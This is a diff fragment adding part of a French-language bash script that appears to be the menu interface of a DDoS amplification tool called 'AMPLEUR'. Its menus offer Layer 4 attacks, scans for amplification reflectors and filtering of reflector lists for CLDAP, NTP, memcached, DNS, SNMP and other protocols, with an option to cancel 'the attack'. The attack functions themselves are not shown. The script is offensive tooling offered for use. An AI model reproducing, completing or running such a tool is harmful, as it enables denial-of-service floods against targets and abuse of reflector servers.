+\033[1;91m│${CYAN} [21] [Filtrage Amp MEMCACH]      \033[1;91m│
+\033[1;91m│${CYAN}  [S] SUPPRIMER UNE LISTE         \033[1;91m│
+\033[1;91m│${CYAN}  [R] RETOUR AU MENU              \033[1;91m│
+\033[1;91m└──────────────────────────────────┘
+${CYAN}[\033[1;91mP A B L O${CYAN}]-家 "
+    read yourch
+    case $yourch in
+    1)  filtrecldap ;;
+	  2)  filtrentp ;;
+    3)  filtrechargen ;;
+	  4)  filtreportmap ;;
+	  5)  filtrets3 ;;  
+    6)  filtredns ;;
+	  7)  filtreftp ;;
+	  8)  filtregrenade ;;
+	  9)  filtreldap ;;
+	  10) filtremssql ;;
+	  11) filtrenetbios ;;
+    12) filtrestun ;;
+	  13) filtreportmap ;;
+	  14) filtrerdp ;;
+	  15) filtrerip ;;
+	  16) filtresentinel ;;
+	  17) filtresnmp ;;
+    18) filtresteam ;;
+	  19) filtretcp ;;
+	  20) filtreudp ;;
+	  21) filtrememcached ;;	  	  
+	  S) dliste ;;
+	  R) Take_input1 ;;
+      *) echo "Selection invalide," ;
+         echo "Appuyez sur entrer." ; read ;;
+ esac
+done
+}
+
+trap exit_script 2
+
+Take_l7
+
+exit_script1()
+{
+  exit 1
+}
+
+Take_input1()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+ █████╗ ███╗   ███╗██████╗ ██╗     ███████╗██╗   ██╗██████╗ 
+██╔══██╗████╗ ████║██╔══██╗██║     ██╔════╝██║   ██║██╔══██╗
+███████║██╔████╔██║██████╔╝██║     █████╗  ██║   ██║██████╔╝
+██╔══██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══╝  ██║   ██║██╔══██╗
+██║  ██║██║ ╚═╝ ██║██║     ███████╗███████╗╚██████╔╝██║  ██║
+╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
+              Remake By Syntaxe Papa Pablo  Obito
+
+\033[1;91m┌──────────────────────────────────┐
+\033[1;91m│${CYAN} [1] LAYER 4                      \033[1;91m│
+\033[1;91m│${CYAN} [2] Scan Amplification           \033[1;91m│
+\033[1;91m│${CYAN} [3] Filtrage Amplification       \033[1;91m│
+\033[1;91m│${CYAN} [CTRL+C] POUR ANNULER L'ATTAQUE  \033[1;91m│
+\033[1;91m│${CYAN} [X] FERMER.                      \033[1;91m│
+\033[1;91m└──────────────────────────────────┘
+${CYAN}[\033[1;91mP A B L O${CYAN}]-家 "
+    read yourch
+    case $yourch in
+	  1) _l4 ;;
+	  2) _l7 ;;
+    3) _l5 ;;
+	  X) exit 1  ;;
+      *) echo "Selection invalide," ;
+         echo "Appuyez sur entrer." ; read ;;
+ esac
+done # end_while
+}
+#
+# Set trap to for CTRL+C interrupt i.e. Install our error handler
+# When occurs it first it calls del_file() and then exit
+#
+trap exit_script 2
+#
+# Call our user define function : Take_inpt1
+#
+
+Take_input1
